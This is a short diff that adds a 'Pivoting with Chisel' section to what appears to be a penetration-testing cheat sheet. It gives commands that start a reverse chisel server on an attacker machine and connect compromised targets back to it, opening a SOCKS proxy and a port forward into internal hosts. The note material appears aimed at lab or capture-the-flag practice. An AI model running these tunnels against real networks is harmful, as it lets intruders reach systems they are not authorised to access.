@@ -214,6 +214,22 @@ https://gtfobins.github.io/
 ## Windows Privilege Escalation
 
 ## Useful Commands
+
+### Pivoting with Chisel
+```bash
+# On kali
+./chisel server -p LISTEN_PORT --reverse
+./chisel server -p 8000 --reverse
+
+# On Target Reverse SOCKS Proxy
+./chisel client ATTACKING_IP:LISTEN_PORT R:socks
+./chisel client 10.50.106.175:8000 R:socks
+
+# On Target to Remote Port Forward
+./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_POR
+./chisel client 10.50.106.175:8000 R:1080:10.200.105.150:80
+
+```
 ### File Transfer
 
 ### Reverse Shell
